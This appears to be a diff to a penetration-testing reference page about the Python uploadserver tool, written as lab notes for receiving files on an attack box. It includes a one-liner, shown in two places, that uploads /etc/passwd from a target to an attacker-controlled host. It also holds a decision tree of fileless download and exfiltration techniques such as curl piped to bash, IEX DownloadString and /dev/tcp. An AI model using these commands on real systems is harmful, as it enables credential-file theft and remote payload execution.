@@ -9,6 +9,99 @@ hideFooterPagination: true
 
 {/* Generated from Commands/uploadserver.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## uploadserver: choose the operation and read the result
+
+Receive HTTP file uploads on Kali.
+
+### What the result establishes
+
+Confirm the upload endpoint and the file written by the receiving server, then compare size and digest.
+
+### Prerequisites and common failures
+
+An ordinary Python HTTP server is not an upload receiver; authentication, endpoint path and request format must match the installed upload server.
+
+### Example 1: Commands
+
+Run in: **Kali — receive folder**. Requires the uploadserver module. Receives multipart uploads at http://KALI_IP:8000/upload; plain http.server cannot receive them.
+
+```bash
+python3 -m uploadserver
+```
+
+### Example 2: PowerShell Web Uploads
+
+Run in: **Saved lab example**.
+
+```bash
+pip3 install uploadserver
+python3 -m uploadserver
+```
+
+Saved context: [File Transfers for Linux and Windows — PowerShell Web Uploads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-uploads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Python Upload
+
+Run in: **Saved lab example**.
+
+```bash
+# Start uploadserver on attack box first
+python3 -c 'import requests;requests.post("http://<IP>:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+Saved context: [File Transfers for Linux and Windows — Python Upload](/post-exploitation/file-transfers-cheat-sheet#python-upload). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Web Upload (Python uploadserver with HTTPS)
+
+Run in: **Saved lab example**.
+
+```bash
+# On attack box — create self-signed cert and start server
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+Saved context: [File Transfers for Linux and Windows — Web Upload (Python uploadserver with HTTPS)](/post-exploitation/file-transfers-cheat-sheet#web-upload-python-uploadserver-with-https). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Quick Decision Tree
+
+Run in: **Saved lab example**.
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Receive HTTP file uploads on Kali.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=uploadserver) · [All tools](/index)
@@ -42,6 +135,13 @@ pip3 install uploadserver
 python3 -m uploadserver
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — PowerShell Web Uploads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-uploads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Python Upload">
@@ -54,6 +154,13 @@ python3 -m uploadserver
 # Start uploadserver on attack box first
 python3 -c 'import requests;requests.post("http://<IP>:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Python Upload](/post-exploitation/file-transfers-cheat-sheet#python-upload)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -91,6 +198,13 @@ UPLOADING FROM LINUX:
 └── Nothing works?      → Start python3 -m http.server on target, wget from attacker
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Web Upload (Python uploadserver with HTTPS)">
@@ -106,6 +220,21 @@ mkdir https && cd https
 sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Web Upload (Python uploadserver with HTTPS)](/post-exploitation/file-transfers-cheat-sheet#web-upload-python-uploadserver-with-https)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
